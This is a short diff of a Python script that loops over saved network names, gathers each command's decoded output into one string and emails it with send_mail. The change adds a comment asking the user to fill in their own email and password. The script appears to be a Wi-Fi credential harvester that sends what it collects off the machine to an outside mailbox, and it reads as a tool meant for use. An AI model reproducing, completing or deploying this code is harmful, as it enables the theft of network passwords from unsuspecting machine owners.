@@ -27,5 +27,5 @@ for netowrk_name in network_names_list:
 	current_result = cresult.decode("utf-8")
 	result = result + current_result
 
-
+#Write Your Email & Password Here
 send_mail("test@gmail.com", "123456", result)
